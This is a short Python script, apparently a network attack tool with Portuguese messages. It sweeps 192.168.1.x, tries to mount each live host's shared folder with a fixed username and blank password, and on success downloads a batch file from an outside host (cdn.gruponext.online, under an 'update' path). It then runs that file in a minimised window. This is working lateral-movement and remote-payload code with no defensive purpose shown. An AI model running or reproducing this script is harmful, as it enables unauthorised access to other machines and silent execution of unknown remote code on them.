import subprocess
import os
import urllib.request
import tempfile

def try_access(ip):
    username = "ALUNO SA"
    password = ""  # Sem senha
    
    command = f'net use \\\\{ip}\\shared_folder /user:{username} {password}' 

    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result.returncode == 0:
            print(f"Conexão bem-sucedida com {ip}")
            run_bubble_script(ip)  
        else:
            print(f"Falha ao tentar conectar com {ip}: {result.stderr.decode()}")
    except Exception as e:
        print(f"Erro ao tentar acessar {ip}: {e}")

def run_bubble_script(ip):
    try:
        temp_dir = tempfile.mkdtemp()  
        bubble_bat_path = os.path.join(temp_dir, "bubble.bat")

        url = "https://cdn.gruponext.online/update-sa/bubble.bat"
        
        print(f"Baixando o bubble.bat de {url} para {bubble_bat_path}")
        urllib.request.urlretrieve(url, bubble_bat_path)

        command = f"start /min cmd /c {bubble_bat_path}"
        subprocess.run(command, shell=True)
        print(f"Script {bubble_bat_path} executado com sucesso.")
    except Exception as e:
        print(f"Erro ao tentar baixar ou executar o script: {e}")

def scan_network():
    ip_prefix = "192.168.1." 
    for i in range(1, 255):
        ip = f"{ip_prefix}{i}"
        try:
            response = subprocess.run(["ping", "-n", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if response.returncode == 0:
                print(f"IP {ip} está online.")
                try_access(ip)  
            else:
                print(f"IP {ip} está offline.")
        except Exception as e:
            print(f"Erro ao tentar acessar o IP {ip}: {e}")

if __name__ == "__main__":
    scan_network()